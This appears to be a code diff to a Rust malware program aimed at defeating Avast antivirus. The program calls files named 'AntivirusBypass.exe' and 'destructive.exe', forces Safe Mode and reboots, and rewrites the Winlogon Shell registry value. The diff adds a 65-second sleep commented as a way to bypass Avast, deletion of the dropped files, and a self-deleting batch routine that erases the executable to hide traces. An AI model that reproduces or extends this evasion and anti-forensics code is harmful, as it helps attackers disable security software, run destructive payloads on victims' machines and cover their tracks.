@@ -7,6 +7,8 @@ use winreg::RegKey;
 use std::fs;
 use std::env;
 use std::ffi::OsString;
+use std::time::Duration;
+use std::thread::sleep;
 
 // Updated function to check if the system is in Safe Mode
 fn is_in_safe_mode() -> bool {
@@ -186,6 +188,8 @@ if %errorlevel% == 0 (
     echo Safe Mode is enabled, proceeding with actions...
 ) else (
     echo Safe Mode is not enabled
+    del "c:\program files\utkudrk2\AntivirusBypass.exe"
+    del "c:\program files\utkudrk2\utkdurk2.bat"
     "c:\program files\utkudrk2\destructive.exe"
     exit
 )
@@ -279,35 +283,63 @@ fn modify_registry_revert() -> io::Result<()> {
     let dir_path = r"C:\Program Files\utkudrk2";
     let txt_file_path = Path::new(dir_path).join("execution_marker.txt");
 
-    // Check if the marker file exists
+    // Open the registry key for Winlogon
+    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
+    let winlogon_key = hkcu.open_subkey_with_flags(
+        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
+        KEY_SET_VALUE,
+    )?;
+
+    // Delete the existing "Shell" value if it exists
+    match winlogon_key.delete_value("Shell") {
+        Ok(_) => println!("Existing Shell value deleted (reverting)."),
+        Err(e) => eprintln!("Failed to delete Shell value (reverting): {}", e),
+    }
+
+    // Set the "Shell" value back to explorer.exe
+    winlogon_key.set_value("Shell", &OsString::from("explorer.exe"))?;
+    println!("Registry reverted: Shell set to explorer.exe");
+
+    // Optionally, delete the marker file after reverting
     if txt_file_path.exists() {
-        // File exists, revert registry changes and set "Shell" back to explorer.exe
-        println!("Execution marker found. Reverting registry changes.");
-
-        // Open the registry key for Winlogon
-        let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
-        let winlogon_key = hkcu.open_subkey_with_flags(
-            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
-            KEY_SET_VALUE,
-        )?;
-
-        // Delete the existing "Shell" value if it exists
-        match winlogon_key.delete_value("Shell") {
-            Ok(_) => println!("Existing Shell value deleted (reverting)."),
-            Err(e) => eprintln!("Failed to delete Shell value (reverting): {}", e),
-        }
-
-        // Set the "Shell" value back to explorer.exe
-        winlogon_key.set_value("Shell", &OsString::from("explorer.exe"))?;
-        println!("Registry reverted: Shell set to explorer.exe");
-
-        // Optionally, delete the marker file after reverting
         fs::remove_file(txt_file_path)?;
-
-        return Ok(());
+        println!("Execution marker deleted.");
     }
 
     Ok(())
+}
+
+fn self_delete() -> io::Result<()> {
+    // Get the path of the current executable
+    if let Ok(exe_path) = env::current_exe() {
+        let exe_str = exe_path.to_string_lossy();
+        let batch_file_path = exe_path.with_extension("bat");
+
+        // Create a batch script that deletes the executable after the program finishes
+        let batch_script = format!(
+            r#"
+            @echo off
+            timeout /t 1 /nobreak > NUL
+            del /f /q "{}"
+            "#,
+            exe_str
+        );
+
+        // Write the batch script to a .bat file
+        fs::write(batch_file_path.clone(), batch_script)?;
+
+        // Run the batch script
+        Command::new(batch_file_path)
+            .stderr(Stdio::null())
+            .stdout(Stdio::null())
+            .spawn()?;
+
+        // Return Ok as the batch script is now running and will delete the executable
+        return Ok(());
+    }
+
+    // Return an error if the executable path can't be found
+    Err(io::Error::new(io::ErrorKind::NotFound, "Executable path not found"))
 }
 
 fn main() {
@@ -326,6 +358,10 @@ fn main() {
         // Step 3: Check if the system is in Safe Mode
         if !is_in_safe_mode() {
             println!("System is not in Safe Mode. Enabling Safe Mode and rebooting...");
+
+            //Sleep 65 seconds to bypass Avast
+            println!("Sleeping for 65 seconds...");
+            sleep(Duration::from_secs(65));
 
             // Enable Safe Mode
             if let Err(e) = enable_safe_mode() {
@@ -380,6 +416,10 @@ fn main() {
             eprintln!("Error rebooting system: {}", e);
         }
 
+        if let Err(e) = self_delete() {
+            eprintln!("Error self delete: {}", e);
+        }
+
     } else {
         println!("Avast not detected. Proceeding with normal operations...");
 
@@ -416,5 +456,10 @@ fn main() {
         if let Err(e) = modify_registry() {
             eprintln!("Error modifying the registry: {}", e);
         }
+
+        if let Err(e) = self_delete() {
+            eprintln!("Error self delete: {}", e);
+        }
+
     }
 }
